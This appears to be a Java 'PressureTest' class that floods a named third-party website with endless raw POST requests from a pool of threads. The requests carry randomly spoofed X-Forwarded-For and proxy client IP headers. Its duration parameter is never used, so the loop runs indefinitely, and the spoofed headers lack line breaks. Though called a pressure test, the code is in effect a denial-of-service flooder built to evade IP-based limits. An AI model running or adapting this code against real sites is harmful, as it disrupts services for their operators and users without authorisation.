package org.coody.czone.web;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class PressureTest {

	public static void main(String[] args) throws Exception {
		httpFlush("https://www.renren.io/topic/all/page/200", 30, 5000, 100000);
	}

	/**
	 * 发包方法
	 * @urlString 目标网址
	 * @thread 线程数
	 * @connecttimeOut 连接超时时间
	 * @timeMillisecond 压测时长
	 */
	public static void httpFlush(String urlString, Integer thread, Integer connecttimeOut, long timeMillisecond)
			throws Exception {
		URL url = new URL(urlString);
		StringBuilder httpData = new StringBuilder();
		httpData.append("POST " + urlString + " HTTP/1.1\r\n");
		Integer port = url.getPort() == -1 ? 80 : url.getPort();
		String host = url.getHost() + ":" + port;
		httpData.append("Host: " + host + "\r\n");
		httpData.append("Accept: */*\r\n");
		String ip = getRandomIp();
		httpData.append("x-forwarded-for: " + ip);
		httpData.append("Proxy-Client-IP: " + ip);
		httpData.append("WL-Proxy-Client-IP: " + ip);
		httpData.append("Content-Type: application/x-www-form-urlencoded\r\n");
		httpData.append("\r\n");
		byte[] data = httpData.toString().getBytes("UTF-8");
		for (int i = 0; i < thread; i++) {
			sysThreadPool.execute(new Runnable() {
				@SuppressWarnings("resource")
				@Override
				public void run() {
					while (true) {
						try {
							Socket socket = new Socket();
							socket.connect(new InetSocketAddress(url.getHost(), port), connecttimeOut);
							socket.setKeepAlive(true);
							socket.getOutputStream().write(data);
							socket.getOutputStream().flush();
							socket = null;
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
		}
		while (true) {
			Thread.sleep(5);
			//System.gc();
		}
	}

	public static String getRandomIp() {

		return getRanDom(1, 254) + "." + getRanDom(1, 254) + "." + getRanDom(1, 254) + "." + getRanDom(1, 254);
	}

	public static Integer getRanDom(int start, int end) {
		return (int) (Math.random() * (end - start + 1)) + start;
	}

	public static final int CORESIZE_NORMAL = 200;// 线程数
	public static final int MAXCORESIZE = 200; // 最大线程数
	public static final int KEEPALIVETIME = 10; // 10s
	public static final ExecutorService sysThreadPool = new ThreadPoolExecutor(CORESIZE_NORMAL, MAXCORESIZE,
			KEEPALIVETIME, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
}